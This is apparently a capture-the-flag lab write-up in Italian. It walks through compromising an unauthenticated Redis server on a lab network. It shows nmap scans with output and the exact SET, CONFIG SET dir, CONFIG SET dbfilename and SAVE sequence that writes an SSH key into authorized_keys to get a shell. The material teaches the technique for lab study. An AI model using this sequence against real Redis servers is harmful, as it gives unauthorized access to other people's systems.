```
 ========================================================================
   B R E A C H L A B   ::   F I E L D   N O T E S
 ------------------------------------------------------------------------
   phantom track · phile 0x11 · "internal hunt"
 ========================================================================

   target ..: phantom-17  "Internal Hunt"
   class ...: lateral movement · unauth Redis → SSH key write
   tools ...: nmap · redis-cli · CONFIG SET/SAVE
   author ..: noflyfre
   status ..: owned
```

[← indice](../../README.md)

> si scansiona la /24 interna. un vicino espone Redis senza auth: e Redis
> che scrive dove vuole sul disco significa scrivere la tua chiave in
> `authorized_keys` e loggarti come il suo utente.

## ----[ 0x00 · intel ]----

Scansionare la rete interna `10.13.37.0/24`. Un host vicino espone un
servizio senza autenticazione che permette di scrivere su disco:
abusarne la scrittura per una shell come l'utente del servizio e prendere
la flag dalla sua home.

## ----[ 0x01 · recon ]----

Scan dei target del brief (all'inizio con sintassi errata: nmap tratta gli
IP separati da virgola come un unico argomento). Rifatti singolarmente:

```bash
nmap -sV -p 80 10.13.37.30
80/tcp open http BaseHTTPServer 0.6 (Python 3.10.12)
```

L'host management espone SSH, HTTP e una finta API "PhantomOracle" senza
niente di sfruttabile. Uno scan `-p-` sugli altri due:

```bash
nmap -p- 10.13.37.10 10.13.37.20
Nmap scan report for phantom-web... (10.13.37.10)
22/tcp   open  ssh
6379/tcp open  redis

Nmap scan report for phantom-db... (10.13.37.20)
22/tcp open  ssh
```

Uno espone Redis su 6379 — il servizio "senza auth" del brief.

## ----[ 0x02 · il difetto ]----

Redis senza `requirepass` e senza `protected-mode` (o oltre `bind
127.0.0.1`) accetta da chiunque `SET`, `CONFIG SET dir`, `CONFIG SET
dbfilename`, `SAVE`. Combinandoli, Redis scrive un file arbitrario in una
posizione arbitraria (nei limiti dei permessi di `redis-server`).

Tecnica nota (HackTricks): si scrive la propria chiave pubblica SSH come
valore di una chiave Redis, circondata da newline per "ripulire" il resto
del file RDB, poi si reindirizza il salvataggio in
`~/.ssh/authorized_keys` del target:

1. `SET <chiave> "\n\n<pubkey>\n\n"` — la pubkey come valore in memoria.
2. `CONFIG SET dir /home/<utente>/.ssh` — dir di salvataggio.
3. `CONFIG SET dbfilename authorized_keys` — nome file.
4. `SAVE` — serializza il DB su disco; il file resta abbastanza pulito da
   far riconoscere la riga della chiave a OpenSSH.

Scritta la pubkey, ci si autentica via SSH con la privata come utente del
processo Redis.

## ----[ 0x03 · exploit ]----

1. Conferma versione/config:

```bash
nmap --script redis-info -sV -p 6379 10.13.37.10
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 6.0.16 (64 bits)
| redis-info:
|   Version: 6.0.16
|   Role: master
|   Bind addresses:
|     0.0.0.0
```

Redis 6.0.16 su tutte le interfacce, nessuna auth: connessione diretta con
`redis-cli -h <host>`.

2. Pubkey SSH come valore Redis, con newline di padding (valore reale
   omesso):

```text
SET k "\n\n<PROPRIA_CHIAVE_PUBBLICA_SSH>\n\n"
```

3. Reindirizzamento del salvataggio verso `~/.ssh/authorized_keys`
   dell'utente Redis, poi save:

```bash
CONFIG SET dir /home/<utente_redis>/.ssh
CONFIG SET dbfilename authorized_keys
SAVE
```

4. Login SSH con la propria privata come utente del servizio Redis, poi
   flag dalla sua home.

## ----[ 0x04 · loot ]----

Redis 6.0.16 non autenticato su `0.0.0.0` → scrittura della pubkey in
`authorized_keys` → login come l'utente del servizio → flag (nessun valore
risolutivo pubblicato). Lezione: un Redis senza auth non è un database, è
una write primitive sull'intero filesystem.

```
--[ eof ]---------------------------------------------------------------

  breachlab.org · phantom track
```
